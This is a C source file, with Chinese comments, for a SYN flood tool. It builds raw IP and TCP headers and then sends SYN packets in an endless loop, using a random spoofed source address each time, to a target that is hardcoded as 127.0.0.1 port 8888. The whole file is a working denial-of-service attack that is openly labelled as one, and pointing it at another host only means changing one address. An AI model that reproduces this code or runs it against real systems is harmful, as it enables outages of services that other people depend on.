
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

//我们自己写的攻击函数
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
//如果什么都让内核做，那岂不是忒不爽了，咱也试着计算一下校验和。
unsigned short check_sum(unsigned short *addr,int len);

int synflood(){
    int skfd;
    struct sockaddr_in target;
    struct hostent *host;
    const int on=1;
    unsigned short srcport;

    bzero(&target,sizeof(struct sockaddr_in));
    target.sin_family=AF_INET;
    target.sin_port=htons(atoi("8888"));

    if(inet_aton("127.0.0.1",&target.sin_addr)==0)
    {
        host=gethostbyname("127.0.0.1");
        if(host==NULL)
        {
            printf("TargetName Error:%s\n",hstrerror(h_errno));
            exit(1);
        }
        target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
    }

    //将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
    if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
        perror("Create Error");
        exit(1);
    }

    //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
    if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
        perror("IP_HDRINCL failed");
        exit(1);
    }

    //因为只有root用户才可以play with raw csocket :)
    setuid(getpid());
    srcport = atoi("18888");
    attack(skfd,&target,srcport);
}

//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
    char buf[128]={0};
    struct ip *ip;
    struct tcphdr *tcp;
    int ip_len;

    //在我们TCP的报文中Data没有字段，所以整个IP报文的长度
    ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
    //开始填充IP首部
    ip=(struct ip*)buf;

    ip->ip_v = IPVERSION;
    ip->ip_hl = sizeof(struct ip)>>2;
    ip->ip_tos = 0;
    ip->ip_len = htons(ip_len);
    ip->ip_id=0;
    ip->ip_off=0;
    ip->ip_ttl=MAXTTL;
    ip->ip_p=IPPROTO_TCP;
    ip->ip_sum=0;
    ip->ip_dst=target->sin_addr;

    //开始填充TCP首部
    tcp = (struct tcphdr*)(buf+sizeof(struct ip));
    tcp->source = htons(srcport);
    tcp->dest = target->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;

    while(1){
        //源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
        ip->ip_src.s_addr = random();
        tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
        sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
    }
}

//关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
unsigned short check_sum(unsigned short *addr,int len){
    register int nleft=len;
    register int sum=0;
    register unsigned short *w=addr;
    short answer=0;

    while(nleft>1)
    {
        sum+=*w++;
        nleft-=2;
    }
    if(nleft==1)
    {
        *(unsigned char *)(&answer)=*(unsigned char *)w;
        sum+=answer;
    }

    sum=(sum>>16)+(sum&0xffff);
    sum+=(sum>>16);
    answer=~sum;
    return(answer);
}